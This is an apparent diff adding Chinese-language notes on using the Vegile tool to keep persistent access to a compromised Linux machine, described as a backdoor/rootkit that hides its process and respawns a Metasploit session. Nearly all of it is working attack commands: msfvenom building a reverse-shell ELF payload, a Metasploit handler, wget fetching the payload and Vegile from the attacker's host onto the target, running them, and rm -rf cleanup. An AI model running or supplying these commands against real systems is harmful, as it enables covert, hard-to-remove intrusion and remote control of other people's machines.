@@ -1,0 +1,35 @@
+Vegile是用于linux系统渗透测试中的权限维持。Vegile这个工具将设置一个后门/rootkit，
+并且这个后门会直接隐藏进程，无限连接metesploit,持续维持你的Metepreter会话
+即使木马进程被杀死，它依然会再次重新运行，换句话说是该进程无限循环的。  
+
+git clone https://github.com/Screetsec/Vegile.git
+
+
+sudo msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00"  -f elf -o /var/www/html/xiao4
+
+
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/shell/reverse_tcp
+set LHOST 192.168.100.143
+set LPORT 4444
+options  
+run
+
+ssh 192.168.100.132
+wget 192.168.100.143/xiao4 
+chmod +x ./xiao4
+
+ls
+/usr/sbin/ifconfig
+wget 192.168.100.143/vegile.zip
+unzip vegile.zip
+cd Vegile-master
+chmod +x Vegile
+wget 192.168.1.53/xiao4
+chmod +x xiao4
+./Vegile --i xiao4
+./Vegile --u xiao4 无限复制你的metasploit会话，即使他被kill，依然可以再次运行
+
+
+rm -rf /root/Vegile-master
